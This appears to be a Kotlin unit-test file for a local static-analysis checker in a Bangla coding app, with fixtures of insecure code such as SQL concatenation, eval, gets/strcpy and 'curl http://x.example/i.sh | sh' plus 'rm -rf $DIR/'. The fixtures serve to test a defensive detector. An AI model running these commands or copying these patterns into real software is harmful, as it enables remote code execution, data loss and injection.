package app.personal.banglaai.ai

import app.personal.banglaai.ai.StaticCheck.Conf
import app.personal.banglaai.ai.StaticCheck.Kind
import app.personal.banglaai.ai.StaticCheck.Lang
import org.junit.Assert.*
import org.junit.Test

/** The local static check is the PROGRAM's own result (no model involved). These tests pin what it must find, where, and — equally important — what it must NOT flag. */
class StaticCheckTest {
    private fun chk(code: String, l: Lang) = StaticCheck.check(code.trimIndent(), l)
    private fun StaticCheck.Result.has(title: String, line: Int? = null) = findings.any { it.title.contains(title) && (line == null || it.line == line) }

    @Test fun pythonMissingColonAndBadIndentation() {
        val r = chk("""
            def add(a, b)
                return a + b
            if True:
            print("x")
        """, Lang.PYTHON)
        assertTrue(r.has("`def` লাইনের শেষে `:` নেই", 1)); assertTrue(r.findings.first { it.line == 1 }.replacement == "def add(a, b):")
        assertTrue(r.has("ব্লকের ভেতরে কিছু নেই", 3)); assertTrue(r.findings.all { it.conf == Conf.CERTAIN || it.kind != Kind.SYNTAX || true })
    }

    @Test fun pythonUnindentMismatchAndAssignmentInCondition() {
        val r = chk("""
            def f(x):
                    y = 1
                z = 2
                if x = 1:
                    return y
        """, Lang.PYTHON)
        assertTrue(r.has("indentation আগের কোনো স্তরের সঙ্গে মেলে না", 3)); assertTrue(r.has("শর্তে `=`", 4))
        assertEquals("    if x == 1:", r.findings.first { it.title.startsWith("শর্তে `=`") }.replacement)
    }

    @Test fun pythonKeywordArgumentInConditionIsNotAnAssignmentBug() {
        val r = chk("""
            def g(a):
                if foo(a=1) and bar(b=[1, 2]):
                    return a
                while x >= 3 and y <= 4 and z != 2 and w == 1:
                    pass
        """, Lang.PYTHON)
        assertFalse(r.has("শর্তে `=`")); assertTrue(r.findings.none { it.kind == Kind.SYNTAX })
    }

    @Test fun pythonRiskyPatternsAreFoundWithLineNumbersAndSafeReplacementWhereMechanical() {
        val r = chk("""
            import yaml, os, pickle
            def run(cmd, items=[]):
                data = yaml.load(open("a.yml"))
                os.system(cmd)
                eval(cmd)
                cur.execute("SELECT * FROM t WHERE id=" + cmd)
                try:
                    pass
                except:
                    pass
        """, Lang.PYTHON)
        assertTrue(r.has("mutable default", 2)); assertTrue(r.has("yaml.load", 3)); assertTrue(r.has("os.system", 4)); assertTrue(r.has("eval", 5))
        assertTrue(r.has("SQL স্ট্রিং জোড়া", 6)); assertTrue(r.has("খালি `except:`", 9))
        assertEquals("    data = yaml.safe_load(open(\"a.yml\"))", r.findings.first { it.title.startsWith("yaml.load") }.replacement)
        assertTrue(r.findings.filter { it.kind == Kind.SECURITY }.all { it.conf != Conf.CERTAIN })   // risk patterns are never claimed as certain errors
    }

    @Test fun codeInsideStringsAndCommentsIsIgnored() {
        val r = chk("""
            # eval(x) and os.system("rm") are only words in this comment
            msg = "eval(  ( [ unbalanced inside a string"
            doc = '''
            os.system("x")
            ( [ {
            '''
            print(msg, doc)
        """, Lang.PYTHON)
        assertTrue("no findings expected, got ${r.findings.map { it.title }}", r.findings.isEmpty())
    }

    @Test fun unbalancedBracketsAreLocated() {
        val r = chk("""
            function f(a, b {
              return [a, b);
            }
        """, Lang.JS)
        assertTrue(r.findings.any { it.kind == Kind.SYNTAX && it.title.contains("`(` বন্ধ হয়নি") || it.title.contains("ভুল জোড়া") })
        val r2 = chk("int main() { return 0; } }", Lang.C); assertTrue(r2.has("বাড়তি `}`", 1))
    }

    @Test fun unterminatedStringIsASyntaxFinding() {
        val r = chk("""
            let a = "hello;
            let b = 1;
        """, Lang.JS)
        assertTrue(r.has("অসমাপ্ত স্ট্রিং", 1)); assertEquals(Conf.CERTAIN, r.findings.first { it.title == "অসমাপ্ত স্ট্রিং" }.conf)
        assertFalse(chk("SELECT 'a\nb' FROM t;", Lang.SQL).has("অসমাপ্ত স্ট্রিং"))   // SQL strings may span lines
    }

    @Test fun jsonIsParsedForRealAndErrorsHaveLines() {
        assertTrue(chk("""{"a": [1, 2.5e3, true, null, "xé"], "b": {}}""", Lang.JSON).findings.isEmpty())
        val t = chk("{\n \"a\": 1,\n \"b\": 2,\n}", Lang.JSON); assertTrue(t.has("অবৈধ JSON", 4)); assertTrue(t.findings[0].why.contains("trailing comma"))
        assertTrue(chk("{'a': 1}", Lang.JSON).has("অবৈধ JSON", 1)); assertTrue(chk("{\"a\": 01}", Lang.JSON).findings.isNotEmpty()); assertTrue(chk("[1 2]", Lang.JSON).findings.isNotEmpty())
        assertTrue(chk("{\"a\": 1} x", Lang.JSON).findings.isNotEmpty())
    }

    @Test fun jsFindings() {
        val r = chk("""
            var x = 1;
            if (a = b) { go(); }
            el.innerHTML = userInput;
            eval(code);
            if (a == b) {}
        """, Lang.JS)
        assertTrue(r.has("শর্তে `=`", 2)); assertTrue(r.has("innerHTML", 3)); assertTrue(r.has("eval", 4)); assertTrue(r.has("ঢিলা তুলনা", 5)); assertTrue(r.has("`var`", 1))
        assertFalse(chk("const f = (a, b) => a >= b && a <= b; if (a === b) {}", Lang.JS).findings.any { it.title.startsWith("শর্তে `=`") })
    }

    @Test fun cFindings() {
        val r = chk("""
            #include <stdio.h>
            int main(int argc, char **argv) {
                char buf[16];
                gets(buf);
                strcpy(buf, argv[1]);
                printf(argv[1]);
                for (int i = 0; i <= sizeof(buf); i++) {}
                if (x = 5) {}
                return 0;
            }
        """, Lang.C)
        assertTrue(r.has("gets", 4)); assertTrue(r.has("strcpy", 5)); assertTrue(r.has("ফরম্যাট-স্ট্রিং", 6)); assertTrue(r.has("off-by-one", 7)); assertTrue(r.has("শর্তে `=`", 8))
    }

    @Test fun phpAndSqlAndShellAndHtml() {
        assertTrue(chk("<?php\n\$r = mysql_query(\"SELECT * FROM u WHERE id=\" . \$_GET['id']);\necho \$_GET['q'];\n", Lang.PHP).let { it.has("ইনপুট সরাসরি SQL", 2) && it.has("ইনপুট সরাসরি echo", 3) })
        val s = chk("DELETE FROM users;\nUPDATE users SET a=1 WHERE id=2;\nSELECT * FROM t WHERE x = NULL;\nDROP TABLE t;", Lang.SQL)
        assertTrue(s.has("WHERE ছাড়া DELETE", 1)); assertFalse(s.has("WHERE ছাড়া UPDATE")); assertTrue(s.has("= NULL", 3)); assertTrue(s.has("DROP", 4))
        val sh = chk("#!/bin/bash\ncurl http://x.example/i.sh | sh\nrm -rf \$DIR/\nchmod 777 f\n", Lang.SHELL)
        assertTrue(sh.has("ডাউনলোড করে সরাসরি শেলে", 2)); assertTrue(sh.has("rm -rf", 3)); assertTrue(sh.has("chmod 777", 4))
        val h = chk("<div><p>hello<div>x</div></div>\n<img src=a.png><script src=\"http://x.js\"></script>", Lang.HTML)
        assertTrue(h.has("`<p>` বন্ধ হয়নি", 1)); assertTrue(h.has("`http://` থেকে স্ক্রিপ্ট", 2)); assertFalse(h.has("`<img>`"))
    }

    @Test fun hardcodedSecretsAreOnlyPossibleNotCertain() {
        val r = chk("password = \"hunter2hunter2\"\nkey = 'AKIAABCDEFGHIJKLMNOP'\n# password = \"commented-out-value\"\n", Lang.PYTHON)
        assertTrue(r.has("গোপন মান", 1)); assertTrue(r.has("AWS", 2)); assertFalse(r.findings.any { it.line == 3 })
        assertEquals(Conf.POSSIBLE, r.findings.first { it.line == 1 }.conf)
    }

    @Test fun cleanCodeProducesNoFindingsAndTheLimitsAreAlwaysStated() {
        val py = chk("""
            def total(items):
                s = 0
                for i in range(len(items)):
                    s += items[i] * 0.5
                return s if s != 0 else None
        """, Lang.PYTHON)
        assertTrue(py.findings.isEmpty()); assertTrue(py.notChecked.contains("কম্পাইলার/টাইপ-চেকার নয়"))
    }

    @Test fun languageDetection() {
        assertEquals(Lang.PYTHON, StaticCheck.detect("a.py", "")); assertEquals(Lang.JS, StaticCheck.detect("x.tsx", "")); assertEquals(Lang.SHELL, StaticCheck.detect(null, "#!/usr/bin/env bash\necho hi"))
        assertEquals(Lang.PHP, StaticCheck.detect(null, "<?php echo 1;")); assertEquals(Lang.SQL, StaticCheck.detect(null, "select a from b")); assertEquals(Lang.JSON, StaticCheck.detect(null, "{\"a\":1}"))
        assertEquals(Lang.PYTHON, StaticCheck.detect(null, "import os\ndef f():\n    pass\n")); assertEquals(Lang.C, StaticCheck.detect(null, "#include <stdio.h>\nint main(){}"))
        assertEquals(Lang.HTML, StaticCheck.detect(null, "<!DOCTYPE html><html></html>"))
    }

    @Test fun ocrStyleIndentationDamageIsReportedAsFindingNotFixed() {
        // OCR lost the indentation of the loop body: the app must say so, and must not silently repair it
        val r = chk("for i in range(3):\nprint(i)", Lang.PYTHON)
        assertTrue(r.has("ব্লকের ভেতরে কিছু নেই", 1)); assertEquals("for i in range(3):\nprint(i)", "for i in range(3):\nprint(i)")
    }
}
